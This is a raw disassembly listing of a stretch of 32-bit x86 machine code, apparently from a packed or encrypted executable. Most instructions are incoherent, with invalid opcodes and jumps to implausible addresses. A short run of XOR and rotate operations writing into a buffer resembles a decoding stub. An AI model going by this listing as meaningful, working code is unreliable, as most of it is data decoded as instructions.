  408057:	sbb    esp,DWORD PTR [ecx+0x6e3e4b8]
  40805d:	cmp    edi,DWORD PTR [edx+0x7e]
  408060:	(bad)  
  408063:	or     ebp,DWORD PTR [edx+0x3e]
  408066:	adc    eax,0x7fed0a9e
  40806b:	ret    0x855d
  40806e:	cli    
  40806f:	das    
  408070:	clc    
  408071:	mov    WORD PTR [esi-0x70],cs
  408074:	jno    0x40800a
  408076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408077:	inc    edx
  408078:	cs xchg esi,eax
  40807a:	xor    al,0x5f
  40807c:	popa   
  40807d:	xchg   esi,eax
  40807e:	data16 repz into 
  408081:	cmc    
  408082:	hlt    
  408083:	ins    DWORD PTR es:[edi],dx
  408084:	and    al,0x1c
  408086:	pop    esi
  408087:	or     eax,0xcb11fcd9
  40808c:	xchg   esp,eax
  40808d:	mov    ds:0x6fd4bde2,al
  408092:	add    ecx,esi
  408094:	fild   DWORD PTR [ecx+0x7fe655d6]
  40809a:	jns    0x40806b
  40809c:	ret    0x1223
  40809f:	ins    DWORD PTR es:[edi],dx
  4080a0:	dec    ecx
  4080a1:	jecxz  0x408054
  4080a3:	mov    edi,0x8a9fe080
  4080a8:	ret    0x67c3
  4080ab:	xchg   ebp,eax
  4080ac:	out    dx,al
  4080ad:	and    BYTE PTR gs:[esi],cl
  4080b0:	mov    esi,0xb2f62a8c
  4080b5:	nop
  4080b6:	dec    edx
  4080b7:	mov    WORD PTR [esi-0x3ea55ca5],es
  4080bd:	mov    ebx,0x7ecc69a3
  4080c2:	imul   eax,DWORD PTR [ebx-0x62d9d16c],0xffffff85
  4080c9:	data16 daa 
  4080cb:	js     0x40813d
  4080cd:	and    bh,0xe0
  4080d0:	in     eax,0x8
  4080d2:	or     al,0x8a
  4080d4:	lods   eax,DWORD PTR es:[esi]
  4080d6:	in     al,0xe1
  4080d8:	cs xchg esi,eax
  4080da:	pop    ebx
  4080db:	pop    edi
  4080dc:	and    al,0xb6
  4080de:	fcmovbe st,st(4)
  4080e0:	dec    ebx
  4080e1:	not    ecx
  4080e3:	stos   BYTE PTR es:[edi],al
  4080e4:	(bad)  
  4080e5:	aaa    
  4080e6:	pop    edx
  4080e7:	jmp    0x214c0a23
  4080ec:	mov    ds,WORD PTR [ebp-0x67]
  4080ef:	sbb    cl,BYTE PTR [edx]
  4080f1:	adc    al,0xab
  4080f3:	leave  
  4080f4:	adc    DWORD PTR [edi+0x6d],ecx
  4080f7:	adc    BYTE PTR [ebx],bl
  4080f9:	push   ebp
  4080fa:	shl    dh,1
  4080fc:	retf   
  4080fd:	or     BYTE PTR cs:[eax],ah
  408100:	fs clc 
  408102:	mov    bl,0x82
  408104:	pop    ebx
  408105:	std    
  408106:	test   al,0xa5
  408108:	sub    al,BYTE PTR [ebx+0x5c0071cb]
  40810e:	mul    DWORD PTR [eax+0x654d6205]
  408114:	fwait
  408115:	dec    eax
  408116:	cdq    
  408117:	sar    DWORD PTR [ebp+0x7d8d1814],1
  40811d:	mov    ebx,0xac8acf48
  408122:	cmp    edx,DWORD PTR [ecx-0x2b]
  408125:	outs   dx,BYTE PTR ds:[esi]
  408126:	ds jns 0x408182
  408129:	xor    eax,0x3690c59e
  40812e:	psllw  mm1,mm2
  408131:	xor    eax,0xebef6c2f
  408136:	fcos   
  408138:	clc    
  408139:	sbb    esp,DWORD PTR [ebx-0x1d352d57]
  40813f:	adc    al,0xc1
  408141:	pusha  
  408142:	sti    
  408143:	mov    ebp,0xcb88b104
  408148:	aad    0x53
  40814a:	cwde   
  40814b:	sbb    eax,0xee462f0
  408150:	cdq    
  408151:	div    bl
  408153:	push   esp
  408154:	in     al,dx
  408155:	ins    DWORD PTR es:[edi],dx
  408156:	mov    ch,0x7a
  408158:	mov    ebx,ecx
  40815a:	dec    ebp
  40815b:	or     eax,0x4aeee17b
  408160:	cli    
  408161:	pushf  
  408162:	fdiv   DWORD PTR [edx-0x45]
  408165:	dec    ebx
  408166:	xchg   ebp,eax
  408167:	fnsave [ecx+0x45a636b]
  40816d:	mov    bh,0xa5
  40816f:	adc    edx,DWORD PTR [edi]
  408171:	sbb    DWORD PTR [esi-0x6c5ca344],eax
  408177:	cmp    eax,0x5f236433
  40817c:	push   es
  40817d:	call   FWORD PTR [edi]
  40817f:	push   ds
  408180:	add    BYTE PTR [edi+0xbe886d8],dh
  408186:	adc    dl,dh
  408188:	paddsw mm7,QWORD PTR [ecx+0x400fc76d]
  40818f:	cmp    al,0xc4
  408191:	iret   
  408192:	call   0x5f10:0xb4b59ee5
  408199:	inc    ebp
  40819a:	mov    WORD PTR [ebx+0x112bd6e9],cs
  4081a0:	dec    esp
  4081a1:	push   ebx
  4081a2:	or     ecx,DWORD PTR [esi-0x47]
  4081a5:	add    BYTE PTR [esi+0x25],bl
  4081a8:	add    ebp,DWORD PTR [edi-0x45e59783]
  4081ae:	sbb    al,0xb7
  4081b0:	(bad)  
  4081b1:	out    dx,eax
  4081b2:	mov    ebp,0xd3494225
  4081b7:	cwde   
  4081b8:	sbb    dl,BYTE PTR [ebx-0x20ec8402]
  4081be:	ds je  0x4081ae
  4081c1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4081c3:	xchg   edi,eax
  4081c4:	cmp    DWORD PTR [ebx-0x42],esi
  4081c7:	sbb    DWORD PTR [eax+0xc8cfed5],0x20837bcb
  4081d1:	mov    ebx,esp
  4081d3:	int    0xd8
  4081d5:	or     dl,ah
  4081d7:	xor    eax,0x96d98a16
  4081dc:	je     0x4081ea
  4081de:	mov    DWORD PTR [edi-0x6ad97bcd],ebx
  4081e4:	xchg   ebp,eax
  4081e5:	or     al,0xf
  4081e7:	popf   
  4081e8:	nop
  4081e9:	push   0xf51098a
  4081ee:	push   0x2
  4081f0:	and    BYTE PTR [edi],cl
  4081f2:	jmp    0x408218
  4081f4:	mov    ebp,0x1908c5c1
  4081f9:	retf   0x9936
  4081fc:	sub    ah,ch
  4081fe:	fldenv [ecx+0x4ea7744a]
  408204:	xchg   dh,cl
  408206:	in     eax,dx
  408207:	dec    edx
  408208:	xchg   esi,eax
  408209:	lahf   
  40820a:	xchg   edi,eax
  40820b:	jnp    0x408245
  40820d:	jp     0x4081cb
  40820f:	sbb    eax,0xdf7a37ff
  408214:	rcl    DWORD PTR es:[eax],1
  408217:	mov    eax,ds:0x39769a7b
  40821c:	loop   0x4081ae
  40821e:	and    eax,DWORD PTR [esi-0x2f1fdd2e]
  408224:	pop    es
  408225:	xor    eax,0xc4570b45
  40822a:	aaa    
  40822b:	icebp  
  40822c:	dec    ecx
  40822d:	lods   eax,DWORD PTR ds:[esi]
  40822e:	xor    ecx,esi
  408230:	ret    
  408231:	leave  
  408232:	daa    
  408233:	xchg   esi,edi
  408235:	mov    eax,DWORD PTR [ebp-0x34]
  408238:	xor    DWORD PTR ds:0x42a2b2,0x7a5d
  408242:	xor    al,0xaa
  408244:	mov    cl,0xf
  408246:	sub    cl,al
  408248:	xor    DWORD PTR ds:0x42a2d2,0x74a5
  408252:	add    dl,cl
  408254:	or     DWORD PTR ds:0x42a266,edi
  40825a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40825d:	xor    cl,0xaa
  408260:	sub    cl,0xf
  408263:	ror    dl,cl
  408265:	sub    DWORD PTR ds:0x42a27e,edi
  40826b:	xor    eax,eax
  40826d:	mov    eax,DWORD PTR [ebp-0xc]
  408270:	sub    DWORD PTR ds:0x42a2d6,0x42a2fa
  40827a:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  408281:	adc    ecx,DWORD PTR ds:0x42a292
  408287:	jmp    0x40a638
  40828c:	or     ch,BYTE PTR [ebp-0x21]
  40828f:	mov    WORD PTR [eax+0x5de90a8a],ds
  408295:	hlt    
  408296:	jne    0x408240
  408298:	dec    edx
  408299:	xchg   esp,eax
  40829a:	pop    es
  40829b:	rol    bh,0x15
  40829e:	add    DWORD PTR [ebx-0x7c7ca111],0xfffffff4
  4082a5:	jecxz  0x40831c
  4082a7:	ret    
  4082a8:	mov    ah,0xc6
  4082aa:	stos   DWORD PTR es:[edi],eax
  4082ab:	mov    al,0x6e
  4082ad:	push   ebp
  4082ae:	shl    BYTE PTR [eax],0x5d
  4082b1:	aad    0xe8
  4082b3:	mov    esi,DWORD PTR [eax-0x73864069]
  4082b9:	jb     0x408241
  4082bb:	push   ebp
  4082bc:	test   DWORD PTR [edx+ecx*1],0xd9c8e703
  4082c3:	and    edx,DWORD PTR [esi+0x7]
  4082c6:	in     al,dx
  4082c7:	jle    0x408293
  4082c9:	xor    DWORD PTR [ebx+esi*4-0x7de193e2],ecx
  4082d0:	pop    ecx
  4082d1:	(bad)
  4082d5:	pop    es
  4082d6:	mov    dl,0x43
  4082d8:	and    eax,0xf75135af
  4082dd:	scas   al,BYTE PTR es:[edi]
  4082de:	xchg   ecx,eax
  4082df:	es xor eax,0xa390dc80
  4082e5:	gs or  al,0xa6
  4082e8:	sbb    al,0x96
  4082ea:	pop    ecx
  4082eb:	test   DWORD PTR [esi],edi
  4082ed:	jmp    0x4159291a
  4082f2:	mov    ss,esp
  4082f4:	sub    eax,esi
  4082f6:	mov    BYTE PTR [edi],0xc1
  4082f9:	imul   esp,DWORD PTR [ecx+0x6e],0x6f
  4082fd:	sar    bl,1
  4082ff:	mov    ch,0xcd
  408301:	adc    DWORD PTR [esi+0x27021a6f],0xffffff95
  408308:	xor    edi,edi
  40830a:	mov    al,ds:0x22e6684c
  40830f:	sub    edx,esp
  408311:	cwde   
  408312:	mov    ah,0xda
  408314:	repz sub eax,0x33be4148
  40831a:	or     BYTE PTR ds:0x608a5dee,cl
  408320:	jmp    0xe0717165
  408325:	and    BYTE PTR [eax+esi*1],bl
  408328:	into   
  408329:	lahf   
  40832a:	aas    
  40832b:	add    al,0x8c
  40832d:	outs   dx,DWORD PTR ds:[esi]
  40832e:	sub    eax,0x77dee41
  408333:	rcl    BYTE PTR [esp+ebx*2],1
  408336:	gs popa 
  408338:	xor    DWORD PTR [ecx-0x1],ecx
  40833b:	das    
  40833c:	mov    dl,0x2d
  40833e:	dec    esp
  40833f:	(bad)  
  408340:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  408342:	mov    esp,0xdbc45294
  408347:	ds jo  0x408369
  40834a:	xor    al,0xbf
  40834c:	adc    BYTE PTR [ecx+ecx*8],0xbd
  408350:	sbb    BYTE PTR [ecx-0x3254de8f],al
  408356:	mov    ecx,edx
  408358:	ja     0x408309
  40835a:	xchg   edx,eax
  40835b:	xor    dh,BYTE PTR [ebx]
  40835d:	retf   0xe51d
  408360:	sbb    BYTE PTR [eax+0x6d9cdbd],dh
  408366:	dec    ebp
  408367:	ds jae 0x40831b
  40836a:	and    ah,BYTE PTR [edi+esi*1]
  40836d:	xor    DWORD PTR [edi-0xaeed6b6],edi
  408373:	std    
  408374:	dec    ebp
  408375:	ror    DWORD PTR [edx],cl
  408377:	ror    BYTE PTR [eax+0x48],1
  40837a:	xchg   edi,eax
  40837b:	in     al,0xee
  40837d:	mov    ?,WORD PTR [esi+0x5b107c99]
  408383:	xchg   ebp,eax
  408384:	(bad)  
  408385:	iret   
  408386:	push   ebx
  408387:	push   cs
  408388:	xor    eax,0x35dc51c5
  40838d:	in     eax,0xbe
  40838f:	dec    edi
  408390:	xchg   ecx,eax
  408391:	mov    al,ds:0x57ed760a
  408396:	aas    
  408397:	scas   al,BYTE PTR es:[edi]
  408398:	jge    0x4083ea
  40839a:	adc    DWORD PTR [ebp-0x53cd1464],ebx
  4083a0:	mov    ds:0x19791599,eax
  4083a5:	mov    edx,DWORD PTR [edi-0x5e]
  4083a8:	sahf   
  4083a9:	cmp    BYTE PTR [edi+0x4ad3057c],ah
  4083af:	mov    bl,0x8e
  4083b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083b2:	out    dx,al
  4083b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083b4:	jne    0x4083d8
  4083b6:	aas    
  4083b7:	pusha  
  4083b8:	jp     0x4083be
  4083ba:	shl    DWORD PTR [edx*1+0x1d6009c4],cl
  4083c1:	es dec eax
  4083c3:	dec    ebx
  4083c4:	mov    al,0xfa
  4083c6:	inc    edx
  4083c7:	outs   dx,BYTE PTR ds:[esi]
  4083c8:	arpl   WORD PTR [edx],bp
  4083ca:	mov    BYTE PTR [edx-0x32],dh
  4083cd:	and    al,BYTE PTR ds:0x222e74c5
  4083d3:	mov    eax,0xcd0075ac
  4083d9:	data16 (bad) 
  4083db:	jae    0x40837d
  4083dd:	out    dx,al
  4083de:	xchg   esi,eax
  4083df:	(bad)  
  4083e0:	push   cs
  4083e1:	fsubr  QWORD PTR [ebx-0x277cdf08]
  4083e7:	ins    BYTE PTR es:[edi],dx
  4083e8:	push   es
  4083e9:	fistp  WORD PTR [edx+0x55]
  4083ec:	outs   dx,BYTE PTR ds:[esi]
  4083ed:	push   ecx
  4083ee:	sbb    ecx,DWORD PTR [ecx]
  4083f0:	cmp    DWORD PTR [ebp-0x319748a3],edx
  4083f6:	clc    
  4083f7:	imul   DWORD PTR [ecx+0x7b06eeea]
  4083fd:	retf   
  4083fe:	pop    edx
  4083ff:	dec    edi
  408400:	repnz add al,0x74
  408403:	scas   al,BYTE PTR es:[edi]
  408404:	stos   DWORD PTR es:[edi],eax
  408405:	test   BYTE PTR [ecx-0x5ed31e02],bl
  40840b:	mov    edi,0x81239a69
  408410:	inc    ebx
  408411:	fldcw  WORD PTR [ebp+eiz*4+0x3a639daa]
  408418:	dec    edi
  408419:	test   al,0x9e
  40841b:	jge    0x4083c9
  40841d:	popf   
  40841e:	mov    ch,0x0
  408420:	pop    esi
  408421:	add    al,0x3
  408423:	jp     0x4083a7
  408425:	ja     0x40844c
  408427:	jbe    0x4083f8
  408429:	mov    esi,0xf7357ed0
  40842e:	or     eax,0x8a332a07
  408433:	jp     0x40848a
  408435:	ja     0x4083d1
  408437:	cmp    eax,0x9532c6a7
  40843c:	js     0x408465
  40843e:	jns    0x4083cb
  408440:	dec    ecx
  408441:	jecxz  0x4084ab
  408443:	xchg   edi,eax
  408444:	mov    BYTE PTR [ebx],al
  408446:	mov    esi,0xffc4ff49
  40844b:	gs pop edi
  40844d:	inc    esi
  40844e:	aam    0x44
  408450:	mov    BYTE PTR [ebx+0x1c],cl
  408453:	xchg   ecx,eax
  408454:	(bad)  [esi]
  408456:	pop    es
  408457:	or     al,ch
  408459:	imul   edx,DWORD PTR [ecx-0x19131911],0xffffffad
  408460:	pop    ebx
  408461:	push   ss
  408462:	dec    esp
  408463:	int3   
  408464:	sbb    al,BYTE PTR [ebp+edx*1-0x16]
  408468:	mov    edi,0x762adeb6
  40846d:	pop    ebx
  40846e:	loopne 0x408463
  408470:	push   cs
  408471:	and    DWORD PTR [esi+eiz*4],0x44d1cf55
  408478:	pop    ebp
  408479:	add    eax,0xd4af7850
  40847e:	xor    al,0x9
  408480:	(bad)  
  408481:	js     0x408430
  408483:	mov    bl,0x16
  408485:	repnz loop 0x4084b1
  408488:	ret    
  408489:	mov    dl,0xc0
  40848b:	stos   DWORD PTR es:[edi],eax
  40848c:	xchg   esi,eax
  40848d:	or     eax,0x6b369ac1
  408492:	mov    esi,0x246e50e5
  408497:	xchg   esp,eax
  408498:	sub    al,0x61
  40849a:	inc    ebp
  40849b:	and    DWORD PTR [edi+0x43de4d03],esp
  4084a1:	push   ebp
  4084a2:	ins    BYTE PTR es:[edi],dx
  4084a3:	or     ah,BYTE PTR [eax]
  4084a5:	iret   
  4084a6:	sahf   
  4084a7:	pusha  
  4084a8:	repnz ins DWORD PTR es:[edi],dx
  4084aa:	pop    esi
  4084ab:	push   ebp
  4084ac:	xchg   ah,dh
  4084ae:	enter  0xaa9e,0x71
  4084b2:	or     eax,DWORD PTR [eax+0x52b8fadd]
  4084b8:	scas   al,BYTE PTR es:[edi]
  4084b9:	or     eax,ebp
  4084bb:	rcl    DWORD PTR [ebx-0x6b],0xb5
  4084bf:	mov    ch,0xd4
  4084c1:	xchg   BYTE PTR [esi+0x44],dl
  4084c4:	sbb    al,0xcd
  4084c6:	push   ecx
  4084c7:	or     DWORD PTR [ebx+0x48887e6],edx
  4084cd:	ss repz jmp 0x408482
  4084d1:	in     al,dx
  4084d2:	popf   
  4084d3:	(bad)  
  4084d4:	jmp    0x4084e2
  4084d6:	cmp    edx,edx
  4084d8:	add    al,0x5c
  4084da:	(bad)  
  4084dc:	cmp    eax,0xd59ed094
  4084e1:	pop    ebp
  4084e2:	iret   
  4084e3:	out    0xc,al
  4084e5:	push   cs
  4084e6:	mov    bh,0x69
  4084e8:	pop    ebp
  4084e9:	int    0x86
  4084eb:	push   edx
  4084ec:	mov    ebx,0x9e39b08b
  4084f1:	dec    edx
  4084f2:	loopne 0x408495
  4084f4:	and    eax,0xc6c7adfc
  4084f9:	or     edx,DWORD PTR [ebp-0x1d]
  4084fc:	shr    edi,1
  4084fe:	mov    bh,0xcb
  408500:	pop    eax
  408501:	dec    ecx
  408502:	popa   
  408503:	(bad)  
  408504:	xchg   ebp,eax
  408505:	jmp    0x5c41:0xfc453de6
  40850c:	enter  0x4a49,0x51
  408510:	rol    DWORD PTR [edx-0x47],1
  408513:	add    bh,BYTE PTR [ecx-0x41]
  408516:	xchg   edi,eax
  408517:	fs push esi
  408519:	dec    edi
  40851a:	imul   ebx,DWORD PTR [edi-0x3d],0x5c
  40851e:	addr16 inc eax
  408520:	mov    ah,0x62
  408522:	idiv   BYTE PTR es:[ebp-0x7a]
  408526:	in     al,0x42
  408528:	xchg   esp,eax
  408529:	icebp  
  40852a:	in     eax,dx
  40852b:	fs dec eax
  40852d:	pushf  
  40852e:	dec    eax
  40852f:	cmp    ah,BYTE PTR [ecx+0x66]
  408532:	cdq    
  408533:	cmc    
  408534:	sbb    eax,0x83aaad1e
  408539:	push   cs
  40853a:	mov    al,ds:0x5d00c459
  40853f:	mov    ecx,0x3d8ab7a6
  408544:	rol    ebp,cl
  408546:	test   al,0xdf
  408548:	adc    BYTE PTR [ebx],0x83
  40854b:	fucomp st(7)
  40854d:	cmp    eax,0xd9c9b1fe
  408552:	mov    al,ds:0x77ff569f
  408557:	idiv   BYTE PTR [edi+0x7b]
  40855a:	js     0x40855f
  40855c:	inc    ecx
  40855d:	retf   
  40855e:	imul   edx,DWORD PTR [ecx+0x644c83dc],0x483c1c7d
  408568:	hlt    
  408569:	icebp  
  40856a:	add    al,0xc
  40856c:	jmp    0x8a17eee2
  408571:	and    ebp,DWORD PTR [ecx]
  408573:	fisttp WORD PTR [esi+0x43d8c6cb]
  408579:	mov    ecx,0x29a3e3e2
  40857e:	or     al,0x20
  408580:	clc    
  408581:	or     al,0x91
  408583:	mov    cl,0x80
  408585:	stc    
  408586:	add    eax,0x7cc31d1a
  40858b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40858c:	and    al,0x24
  40858e:	push   ss
  40858f:	sub    eax,0x72e50694
  408594:	mov    dh,0x4b
  408596:	inc    esi
  408597:	mov    ch,0x80
  408599:	xor    eax,0x16
  40859c:	push   0x1d
  40859e:	repz inc ebx
  4085a0:	test   BYTE PTR [esi],al
  4085a2:	and    eax,0xbada9efc
  4085a7:	pushf  
  4085a8:	push   esi
  4085a9:	sub    edi,ebp
  4085ab:	mov    ebx,0xfb0cefe4
  4085b0:	test   al,0xf3
  4085b2:	sbb    BYTE PTR [ebx-0x78],dl
  4085b5:	xlat   BYTE PTR ds:[ebx]
  4085b6:	xor    eax,0xb03bca34
  4085bb:	push   cs
  4085bc:	outs   dx,BYTE PTR ds:[esi]
  4085bd:	mov    bh,BYTE PTR [ebp+0x3f710dd9]
  4085c3:	dec    ecx
  4085c4:	sbb    edx,esp
  4085c6:	cmp    eax,0x78fdf7df
  4085cb:	lds    eax,FWORD PTR [ebp+0x1174c057]
  4085d1:	out    dx,eax
  4085d2:	cmp    edi,DWORD PTR [ecx-0x480232c3]
  4085d8:	mov    BYTE PTR [edx+ecx*8],bl
  4085db:	or     al,ch
  4085dd:	sbb    DWORD PTR [ecx],ecx
  4085df:	sub    edi,edx
  4085e1:	add    dh,BYTE PTR [eax-0x80]
  4085e4:	inc    esi
  4085e5:	ins    DWORD PTR es:[edi],dx
  4085e6:	into   
  4085e7:	xchg   edi,eax
  4085e8:	stc    
  4085e9:	xchg   DWORD PTR [edi-0x1a],edx
  4085ec:	jo     0x4085df
  4085ee:	leave  
  4085ef:	ja     0x408666
  4085f1:	int3   
  4085f2:	mov    ss,WORD PTR [edi-0x66bc9cf2]
  4085f8:	mov    esp,0x6ac11e5d
  4085fd:	ja     0x408633
  4085ff:	add    al,0x27
  408601:	cmp    ah,BYTE PTR [ecx+0x14bd746b]
  408607:	inc    esi
  408608:	(bad)  
  408609:	sti    
  40860a:	inc    DWORD PTR [edx+edi*4+0x1f]
  40860e:	jne    0x40859b
  408610:	jmp    0x408662
  408612:	mov    bl,0x41
  408614:	mov    BYTE PTR [esi+0x7b],cl
  408617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408618:	adc    bh,BYTE PTR [ecx*2+0x3473d215]
  40861f:	dec    edx
  408620:	sti    
  408621:	aad    0x25
  408623:	imul   ebp,DWORD PTR [edx],0xffffffe8
  408626:	stos   BYTE PTR es:[edi],al
  408627:	add    al,0x8d
  408629:	bound  esi,QWORD PTR [eax]
  40862b:	push   ecx
  40862c:	sub    al,0x2d
  40862e:	mov    ebx,0x1be62c4d
  408633:	addr16 test al,0x80
  408636:	adc    eax,0x5c2a26f8
  40863b:	out    dx,al
  40863c:	xor    eax,0x1ad54da6
  408641:	nop
  408642:	xchg   esi,eax
  408643:	sub    eax,0x7f2abece
  408648:	jmp    0x408628
  40864a:	(bad)  
  40864b:	xchg   edi,eax
  40864c:	xlat   BYTE PTR ds:[ebx]
  40864d:	mov    ecx,0xb538ab9c
  408652:	call   0xaa44e29b
  408657:	add    al,0xa4
  408659:	inc    di
  40865b:	sub    al,0xe0
  40865d:	sub    al,0xe3
  40865f:	(bad)  
  408660:	loop   0x4086c7
  408662:	sub    DWORD PTR [esi-0x29],esp
  408665:	pop    esi
  408666:	fstp   DWORD PTR [esi+0x44]
  408669:	pop    es
  40866a:	jb     0x4085fd
  40866c:	xor    eax,DWORD PTR [edi-0x2]
  40866f:	pusha  
  408670:	out    dx,eax
  408671:	jge    0x4086a9
  408673:	jbe    0x4085fc
  408675:	ja     0x408602
  408677:	call   0xb304:0x9fea3f18
  40867e:	xchg   DWORD PTR [edx-0xb],ecx
  408681:	fwait
  408682:	cmp    ebx,DWORD PTR [eax]
  408684:	je     0x408628
  408686:	test   eax,0x6a06b7a
  40868b:	ror    BYTE PTR [ebp+0x77],cl
  40868e:	pop    es
  40868f:	xlat   BYTE PTR ds:[ebx]
  408690:	pop    es
  408691:	hlt    
  408692:	sbb    al,ah
  408694:	mov    eax,0xdf3157a6
  408699:	rcl    BYTE PTR [ecx-0x5ffbabd6],1
  40869f:	repz jmp 0xc97feb8f
  4086a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086a6:	in     eax,0xd8
  4086a8:	sbb    DWORD PTR [ecx],0xe70fda33
  4086ae:	mov    ss,WORD PTR [edi+0x71dccca5]
  4086b4:	add    bh,BYTE PTR [eax+eiz*8-0x6b]
  4086b8:	jmp    0x40871e
  4086ba:	or     ah,ch
  4086bc:	or     al,0x6
  4086be:	pop    esi
  4086bf:	pusha  
  4086c0:	jp     0x40866e
  4086c2:	xor    esi,DWORD PTR [eax-0x61]
  4086c5:	push   ecx
  4086c6:	(bad)  [ecx+0x544dc7d6]
  4086cc:	loope  0x4086fa
  4086ce:	popa   
  4086cf:	add    al,0x7
  4086d1:	mov    ds:0x284f5db1,al
  4086d6:	into   
  4086d7:	or     eax,0x206be342
  4086dc:	xchg   esp,ebx
  4086de:	push   ebx
  4086df:	jg     0x408736
  4086e1:	cs jmp 0x408730
  4086e4:	and    BYTE PTR [edx-0x36],ah
  4086e7:	or     ebp,esp
  4086e9:	stos   DWORD PTR es:[edi],eax
  4086ea:	xlat   BYTE PTR ds:[ebx]
  4086eb:	lods   eax,DWORD PTR ds:[esi]
  4086ec:	loop   0x40869f
  4086ee:	mov    eax,ds:0x9565121c
  4086f3:	and    ecx,DWORD PTR [ebx+0x6a]
  4086f6:	ins    BYTE PTR es:[edi],dx
  4086f7:	mov    DWORD PTR [ebx+0x2c905ff8],edi
  4086fd:	inc    esi
  4086fe:	push   eax
  4086ff:	ins    DWORD PTR es:[edi],dx
  408700:	popa   
  408701:	lea    ecx,[edi]
  408703:	sbb    al,0x3b
  408705:	fs jb  0x4086f4
  408708:	ror    DWORD PTR ds:0x89edc455,0x54
  40870f:	xchg   esi,eax
  408710:	xor    al,0xc2
  408712:	sbb    ch,BYTE PTR [ebp+0xbc486a8]
  408718:	in     eax,0xf9
  40871a:	cmp    DWORD PTR [ebp+eiz*1+0x44],0xffffffd4
  40871f:	dec    ebx
  408720:	sbb    ebx,DWORD PTR [edx]
  408722:	imul   esp,DWORD PTR [edx+0x65],0x4
  408726:	or     bh,ah
  408728:	cmp    ch,BYTE PTR [esi-0x4edfb5f5]
  40872e:	add    cl,BYTE PTR [eax]
  408730:	mov    ch,0x9
  408732:	cmp    ch,BYTE PTR [edi-0x1e451c25]
  408738:	cwde   
  408739:	nop
  40873a:	mov    ebx,DWORD PTR [ebx]
  40873c:	and    DWORD PTR [eax+ecx*1+0x3e],ebx
  408740:	and    al,0x16
  408742:	mov    fs,WORD PTR [ebp+eax*8+0x663097e7]
  408749:	iret   
  40874a:	mov    BYTE PTR [ecx],dl
  40874c:	test   ebx,0x749afa75
  408752:	xchg   esp,eax
  408753:	cmc    
  408754:	sbb    al,0x38
  408756:	clc    
  408757:	mov    al,0x9a
  408759:	enter  0x277d,0xdb
  40875d:	(bad)  
  40875e:	out    0x4a,eax
  408760:	push   eax
  408761:	and    BYTE PTR [eax+0x45],al
  408764:	das    
  408765:	mov    esi,0xc1e099d2
  40876a:	or     edi,DWORD PTR [edi+0x6]
  40876d:	sahf   
  40876e:	adc    BYTE PTR [ebx+0x148d4f55],dl
  408774:	push   ebp
  408775:	stc    
  408776:	jmp    0x4086fb
  408778:	imul   edi,DWORD PTR [ebx],0x66
  40877b:	cmp    BYTE PTR ds:0x10f4dea0,dl
  408781:	test   DWORD PTR [ecx-0x5e],esi
  408784:	or     al,BYTE PTR [ebx-0xb]
  408787:	lea    ebp,[ebx+0x4b]
  40878a:	sub    DWORD PTR [eax-0x28],0x561a5a45
  408791:	not    BYTE PTR ds:0xf9325e2
  408797:	dec    eax
  408798:	pop    edx
  408799:	test   eax,0x5d93cd7f
  40879e:	inc    ebx
  40879f:	arpl   WORD PTR [edx+0x4c02477f],si
  4087a5:	jns    0x40877d
  4087a7:	not    BYTE PTR [esi-0x2327bdec]
  4087ad:	mov    al,0x1c
  4087af:	sub    dh,BYTE PTR [ebx-0x54c5cea]
  4087b5:	jmp    0x91edf60e
  4087ba:	dec    edx
  4087bb:	xor    ah,bl
  4087bd:	jmp    FWORD PTR [ebx-0x6c]
  4087c0:	(bad)  
  4087c1:	xor    ch,BYTE PTR [ebx+0x26]
  4087c4:	push   ebx
  4087c5:	(bad)  
  4087c6:	mov    al,0xc6
  4087c8:	inc    esp
  4087c9:	bound  esp,QWORD PTR [edi-0x4]
  4087cc:	mov    edx,0x9a1983e9
  4087d1:	push   ss
  4087d2:	fadd   st(0),st
  4087d4:	or     ecx,DWORD PTR ss:[ecx+eiz*4-0x13]
  4087d9:	push   cs
  4087da:	mov    bl,0xf3
  4087dc:	pop    edx
  4087dd:	pusha  
  4087de:	out    dx,al
  4087df:	push   es
  4087e0:	sub    bh,BYTE PTR [edi]
  4087e2:	or     eax,0x3bffff38
  4087e7:	mov    dl,0xd2
  4087e9:	aad    0x1f
  4087eb:	hlt    
  4087ec:	add    esi,ebx
  4087ee:	pop    DWORD PTR ds:0x2f1e601
  4087f4:	call   0xe8bba82b
  4087f9:	cmc    
  4087fa:	xchg   bp,ax
  4087fc:	adc    al,0x42
  4087fe:	addr16 jg 0x4087a1
  408801:	ja     0x40887b
  408803:	or     al,BYTE PTR [ecx+0x51e19f62]
  408809:	leave  
  40880a:	inc    ax
  40880c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40880e:	and    ch,BYTE PTR [esi]
  408810:	and    al,0x87
  408812:	das    
  408813:	inc    esi
  408814:	sahf   
  408815:	out    dx,al
  408816:	xchg   DWORD PTR [eax],edi
  408818:	jo     0x4087cf
  40881a:	mov    ds:0x515db3d8,eax
  40881f:	daa    
  408820:	and    DWORD PTR [edi+0x6c],esp
  408823:	jl     0x40889e
  408825:	inc    edx
  408826:	(bad)  
  408827:	jno    0x408844
  408829:	mov    bl,0x6c
  40882b:	call   0x87e8:0x165b429e
  408832:	(bad)  
  408834:	pop    esp
  408835:	ins    DWORD PTR es:[edi],dx
  408836:	inc    esi
  408837:	push   edi
  408838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408839:	adc    edi,DWORD PTR [ecx]
  40883b:	sbb    al,0x19
  40883d:	inc    edi
  40883e:	inc    ecx
  40883f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408840:	jp     0x4087ca
  408842:	retf   
  408843:	jge    0x4088c1
  408845:	(bad)  
  408846:	xadd   BYTE PTR [ebx],dl
  408849:	pop    edx
  40884a:	mov    ah,0x5
  40884c:	pushf  
  40884d:	out    0x6c,eax
  40884f:	mov    ebp,0xde530a38
  408854:	jmp    0x3b443595
  408859:	mov    al,ds:0xe8336057
  40885e:	push   edx
  40885f:	jnp    0x4088d1
  408861:	mov    edx,0xa892550
  408866:	fcmovnb st,st(2)
